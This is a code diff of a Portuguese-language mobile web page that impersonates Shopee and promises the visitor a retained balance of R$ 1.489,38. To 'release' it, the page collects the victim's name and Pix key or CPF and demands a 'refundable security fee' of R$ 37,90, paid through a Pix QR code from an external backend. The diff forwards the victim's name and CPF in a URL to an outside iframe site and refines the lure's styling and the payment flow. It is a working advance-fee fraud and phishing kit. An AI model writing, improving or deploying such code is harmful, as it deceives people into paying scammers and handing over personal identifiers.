@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Resgate Shopee</title>
+    <title>Resgate Saldo</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
     <style>
         * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
@@ -11,7 +11,15 @@
         .hidden { display: none !important; }
 
         /* --- TELA 1: SALDO --- */
-        .header-section { background: #ee4d2d; padding: 25px 20px; color: white; border-bottom-left-radius: 25px; border-bottom-right-radius: 25px; box-shadow: 0 4px 10px rgba(238, 77, 45, 0.3); }
+        .header-section { 
+            background: #ee4d2d; 
+            /* AUMENTEI O PADDING-TOP PARA 45PX PARA DESGRUDAR DO TOPO */
+            padding: 45px 20px 30px 20px; 
+            color: white; 
+            border-bottom-left-radius: 25px; 
+            border-bottom-right-radius: 25px; 
+            box-shadow: 0 4px 10px rgba(238, 77, 45, 0.3); 
+        }
         .header-top { display: flex; justify-content: space-between; align-items: flex-start; }
         .coin-icon { width: 48px; height: 48px; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2)); }
         
@@ -26,13 +34,18 @@
         .btn-main:active { transform: scale(0.98); }
         .btn-disabled { background: #e0e0e0; color: #aaa; cursor: not-allowed; box-shadow: none; }
 
-        /* RODAPÉ SHOPEE (Correção do Corte) */
+        /* RODAPÉ SHOPEE (AJUSTADO COM SACOLA MAIOR) */
         .shopee-footer { display: flex; align-items: center; justify-content: space-between; padding-top: 5px; }
-        .shopee-desc { flex: 1; margin-right: 15px; }
+        .shopee-desc { flex: 1; margin-right: 10px; }
         .shopee-desc h4 { margin: 0 0 4px 0; font-size: 14px; font-weight: 800; color: #333; }
         .shopee-desc p { margin: 0; font-size: 11px; line-height: 1.4; color: #666; }
-        /* Logo ajustado para não cortar */
-        .shopee-logo-img { width: 50px; height: auto; object-fit: contain; }
+        
+        /* ÍCONE DA SACOLA GRANDE */
+        .bag-icon-svg { 
+            width: 75px; /* AUMENTADO PARA DAR DESTAQUE */
+            height: 75px; 
+            flex-shrink: 0;
+        }
 
         /* --- TELA 2: MODAL SHEET --- */
         .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 200; display: flex; align-items: flex-end; backdrop-filter: blur(2px); }
@@ -55,17 +68,8 @@
 
         /* --- TELA 4: VSL FULLSCREEN --- */
         .vsl-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 150; display: flex; flex-direction: column; }
-        /* Iframe ocupa quase tudo, deixando espaço para o botão */
         .vsl-frame { flex: 1; width: 100%; border: none; }
-        
-        /* Botão Fixo no Rodapé da VSL */
-        .vsl-footer-btn { 
-            padding: 15px 20px; 
-            background: white; 
-            border-top: 1px solid #eee; 
-            box-shadow: 0 -2px 10px rgba(0,0,0,0.1);
-            z-index: 160;
-        }
+        .vsl-footer-btn { padding: 15px 20px; background: white; border-top: 1px solid #eee; box-shadow: 0 -2px 10px rgba(0,0,0,0.1); z-index: 160; }
 
         /* --- MODAL QR CODE --- */
         .qr-box { background: white; padding: 25px; border-radius: 15px; width: 90%; max-width: 340px; margin: auto; text-align: center; position: relative; }
@@ -112,7 +116,12 @@
                     <h4>Acesso Exclusivo</h4>
                     <p>Descubra todos os benefícios liberados para você. Conclua o acesso para aproveitar as vantagens de forma segura.</p>
                 </div>
-                <img src="https://upload.wikimedia.org/wikipedia/commons/f/fe/Shopee.svg" class="shopee-logo-img" alt="Shopee Logo">
+                
+                <svg class="bag-icon-svg" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M8 7V5C8 3.34315 9.34315 2 11 2H13C14.6569 2 16 3.34315 16 5V7" stroke="#EE4D2D" stroke-width="2" stroke-linecap="round"/>
+                    <rect x="4" y="7" width="16" height="15" rx="2" fill="#EE4D2D"/>
+                    <path d="M9 11C9 11 9.5 12 12 12C14.5 12 15 11 15 11" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
             </div>
         </div>
     </div>
@@ -120,10 +129,8 @@
     <div id="modal-data" class="modal-overlay hidden">
         <div class="modal-sheet">
             <h2 style="text-align:center; font-size:18px; margin:0 0 20px 0; color:#333;">Dados para Recebimento</h2>
-            
             <label>Nome Completo</label>
             <input type="text" id="input-nome" placeholder="Nome do titular da conta">
-
             <label>Tipo de Chave Pix</label>
             <select id="input-tipo" onchange="maskKey()">
                 <option value="cpf">CPF</option>
@@ -131,15 +138,10 @@
                 <option value="email">E-mail</option>
                 <option value="random">Chave Aleatória</option>
             </select>
-
             <label>Chave Pix</label>
             <input type="tel" id="input-chave" placeholder="000.000.000-00">
-
             <button class="btn-main" style="margin-top:25px;" onclick="goToConfirm()">CONTINUAR PARA PAGAMENTO</button>
-            
-            <div style="text-align:center; font-size:11px; color:#999; margin-top:15px; display:flex; justify-content:center; gap:5px;">
-                🔒 Ambiente Seguro Shopee Pay
-            </div>
+            <div style="text-align:center; font-size:11px; color:#999; margin-top:15px; display:flex; justify-content:center; gap:5px;">🔒 Ambiente Seguro Shopee Pay</div>
         </div>
     </div>
 
@@ -147,47 +149,28 @@
         <div style="padding: 20px;">
             <div style="font-size:28px; font-weight:900; color:#333;">R$ 1.489,38</div>
             <p style="font-size:13px; color:#777; margin:0 0 20px 0;">Saldo retido aguardando liberação</p>
-
             <div class="confirm-card">
                 <h4 style="margin:0; font-size:14px; text-transform:uppercase; color:#555;">Taxa de Segurança</h4>
-                
                 <div class="tax-row">
                     <span style="font-size:26px; font-weight:800; color:#d32f2f;">R$ 37,90</span>
                     <span class="badge-refund">Reembolsável</span>
                 </div>
-                
-                <p style="font-size:13px; color:#666; line-height:1.4; margin:0;">
-                    Para evitar fraudes, é necessário confirmar sua identidade. O valor de <strong>R$ 37,90</strong> retornará para sua conta junto com o saldo total.
-                </p>
-
+                <p style="font-size:13px; color:#666; line-height:1.4; margin:0;">Para evitar fraudes, é necessário confirmar sua identidade. O valor de <strong>R$ 37,90</strong> retornará para sua conta junto com o saldo total.</p>
                 <div class="data-list">
                     <div style="font-size:10px; font-weight:700; color:#aaa; margin-bottom:8px; text-transform:uppercase;">Destino do Saque</div>
-                    <div class="d-row">
-                        <span style="color:#777;">Nome</span>
-                        <span style="font-weight:600;" id="txt-nome">...</span>
-                    </div>
-                    <div class="d-row">
-                        <span style="color:#777;">Chave Pix</span>
-                        <span style="font-weight:600;" id="txt-chave">...</span>
-                    </div>
-                    <div class="d-row">
-                        <span>Valor Total</span>
-                        <span>R$ 1.489,38</span>
-                    </div>
+                    <div class="d-row"><span style="color:#777;">Nome</span><span style="font-weight:600;" id="txt-nome">...</span></div>
+                    <div class="d-row"><span style="color:#777;">Chave Pix</span><span style="font-weight:600;" id="txt-chave">...</span></div>
+                    <div class="d-row"><span>Valor Total</span><span>R$ 1.489,38</span></div>
                 </div>
             </div>
-
             <button class="btn-main" onclick="goToVSL()" style="margin-top:10px;">LIBERAR SAQUE AGORA</button>
         </div>
     </div>
 
     <div id="screen-vsl" class="vsl-container hidden">
         <iframe class="vsl-frame" src="https://recuperabonushopp.com/elementor-1623"></iframe>
-        
         <div class="vsl-footer-btn">
-            <button id="btn-final" class="btn-main" onclick="gerarPixAPI()">
-                PAGAR TAXA E RECEBER SALDO
-            </button>
+            <button id="btn-final" class="btn-main" onclick="gerarPixAPI()">PAGAR TAXA E RECEBER SALDO</button>
         </div>
     </div>
 
@@ -195,12 +178,9 @@
         <div class="qr-box">
             <h3 style="margin-top:0; color:#333;">Pagamento via Pix</h3>
             <p style="font-size:13px; color:#666; margin-bottom:15px;">Copie o código abaixo e pague no seu banco.</p>
-            
             <img id="qr-img" style="width:180px; height:180px; display:block; margin:0 auto; border:1px solid #eee; padding:5px;">
-            
             <div style="text-align:left; font-size:11px; font-weight:700; margin-top:15px; color:#555;">Copia e Cola:</div>
             <textarea id="pix-copy" class="pix-area" readonly></textarea>
-            
             <button class="btn-main" onclick="copyCode()">COPIAR CÓDIGO</button>
             <button onclick="document.getElementById('modal-qr').classList.add('hidden')" style="background:none; border:none; margin-top:10px; color:#999;">Fechar</button>
         </div>
@@ -209,7 +189,7 @@
     <script>
         const API = "https://checkout-pix-profissional.onrender.com";
 
-        // 1. Animação Inicial
+        // 1. Animação
         function anim(id, val) {
             let cur = 0, el = document.getElementById(id), step = val/40;
             let t = setInterval(() => {
@@ -226,7 +206,7 @@
         function selectBig() { selectOpt(document.getElementById('big-opt')); }
         function openModalData() { if(sel) document.getElementById('modal-data').classList.remove('hidden'); }
 
-        // 3. Máscaras e Dados
+        // 3. Máscaras
         function maskKey() {
             let t = document.getElementById('input-tipo').value, i = document.getElementById('input-chave');
             i.value=""; 
@@ -239,16 +219,10 @@
             if(t==='cpf') { v=v.replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d{1,2})$/,"$1-$2"); e.target.value=v; }
         });
 
-        // 4. Confirmação -> VSL
-        // --- ATUALIZE ESSAS DUAS FUNÇÕES NO SEU SCRIPT ---
-
+        // 4. Confirmação -> VSL (ENVIO DE DADOS VIA URL)
         function goToConfirm() {
-            let n = document.getElementById('input-nome').value;
-            let c = document.getElementById('input-chave').value; // Usando campo chave como CPF/ID
-            
-            // Validação simples
-            if(n.length < 3 || c.length < 3) return alert("Preencha os dados corretamente.");
-            
+            let n = document.getElementById('input-nome').value, c = document.getElementById('input-chave').value;
+            if(n.length<3 || c.length<4) return alert("Preencha corretamente.");
             document.getElementById('txt-nome').innerText = n;
             document.getElementById('txt-chave').innerText = c;
             
@@ -259,47 +233,46 @@
         }
 
         function goToVSL() {
-            // Pega os dados preenchidos
+            // Pega dados para passar para VSL
             let nome = document.getElementById('input-nome').value;
-            let cpf = document.getElementById('input-chave').value.replace(/\D/g, ''); // Limpa o CPF
-            if(!cpf) cpf = "00000000000"; // Fallback
+            let cpf = document.getElementById('input-chave').value.replace(/\D/g, ''); 
+            if(!cpf) cpf = "00000000000"; 
 
-            // Link original do Elementor
             const baseURL = "https://recuperabonushopp.com/elementor-1623";
-            
-            // CRIA O LINK COM OS DADOS (A MÁGICA ACONTECE AQUI)
-            // Envia: ?nome=Cliente&cpf=123456
             const finalURL = `${baseURL}?nome=${encodeURIComponent(nome)}&cpf=${cpf}`;
 
-            // Atualiza o Iframe com o link novo contendo os dados
+            // Atualiza o iframe
             document.querySelector('.vsl-frame').src = finalURL;
 
-            // Mostra a tela
             document.getElementById('screen-confirm').classList.add('hidden');
             document.getElementById('screen-vsl').classList.remove('hidden');
         }
-        // 5. Gerar Pix (Backend)
+
+        // 5. Gerar Pix (Backend Render)
         async function gerarPixAPI() {
             let btn = document.getElementById('btn-final');
             let n = document.getElementById('input-nome').value;
-            
+            let cpfRaw = document.getElementById('input-chave').value.replace(/\D/g, '');
+            if(!cpfRaw) cpfRaw = "00000000000";
+
             btn.disabled = true; btn.innerText = "GERANDO QR CODE...";
 
             try {
-                let res = await fetch(`${API}/vizzion-pix`, {
+                let res = await fetch(`${API}/pix`, {
                     method:'POST', headers:{'Content-Type':'application/json'},
-                    body: JSON.stringify({ name: n, email: 'cliente@shopee.com', cpf: '00000000000' })
+                    body: JSON.stringify({ name: n, cpf: cpfRaw, amount: 37.90 })
                 });
                 let json = await res.json();
                 
-                if(json.qr_imagem || json.qr_copia) {
-                    let img = json.qr_imagem;
-                    if(!img.startsWith('data:')) img = `data:image/png;base64,${img}`;
-                    document.getElementById('qr-img').src = img;
-                    document.getElementById('pix-copy').value = json.qr_copia;
+                if(json.point_of_interaction) {
+                    let img = json.point_of_interaction.transaction_data.qr_code_base64;
+                    let code = json.point_of_interaction.transaction_data.qr_code;
+                    
+                    document.getElementById('qr-img').src = `data:image/png;base64,${img}`;
+                    document.getElementById('pix-copy').value = code;
                     document.getElementById('modal-qr').classList.remove('hidden');
                 } else {
-                    alert("Erro ao gerar Pix. Tente novamente.");
+                    alert("Erro ao gerar Pix.");
                 }
             } catch(e) { alert("Erro de conexão."); }
             
